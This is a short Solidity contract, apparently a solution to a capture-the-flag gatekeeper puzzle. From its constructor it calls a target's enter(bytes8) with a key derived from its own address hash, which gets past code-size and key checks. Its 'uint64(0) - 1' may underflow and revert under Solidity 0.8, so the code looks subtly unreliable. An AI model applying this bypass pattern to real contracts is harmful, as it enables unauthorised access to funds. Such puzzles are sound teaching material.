

pragma solidity ^0.8.4;

contract LetMeIn {
    constructor(address _addr)  {
        bytes8 key = bytes8( uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1) );
        _addr.call(abi.encodeWithSignature('enter(bytes8)', key));
    }
}